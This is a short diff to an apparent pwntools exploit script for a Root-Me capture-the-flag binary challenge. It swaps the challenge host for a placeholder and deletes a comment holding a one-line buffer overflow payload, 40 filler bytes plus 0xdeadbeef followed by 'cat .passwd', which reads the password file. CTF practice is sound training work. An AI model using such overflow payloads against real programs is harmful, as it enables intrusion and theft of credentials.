@@ -17,7 +17,7 @@ def conn():
     elif args.LOCAL:
         return process([elf.path])
     else:
-        return remote("app-systeme-ch13@challenge02.root-me.org", 2222)
+        return remote("addr", 2222)
 
 io = conn()
 
@@ -34,5 +34,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
-# (python -c 'print "1"*40 + "\xef\xbe\xad\xde"'; echo cat .passwd) | ./ch13
